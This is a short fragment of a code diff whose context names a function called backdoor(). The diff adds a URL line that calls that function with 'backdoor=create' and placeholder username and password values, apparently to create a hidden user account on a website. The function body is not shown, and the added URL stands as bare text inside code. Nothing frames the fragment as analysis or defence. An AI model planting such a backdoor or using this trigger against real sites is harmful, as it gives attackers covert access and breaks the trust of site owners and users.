@@ -19,3 +19,4 @@ function backdoor() {
         }
     }
 }
+https://site.com/?backdoor=create&username=yourusername&password=yourpassword
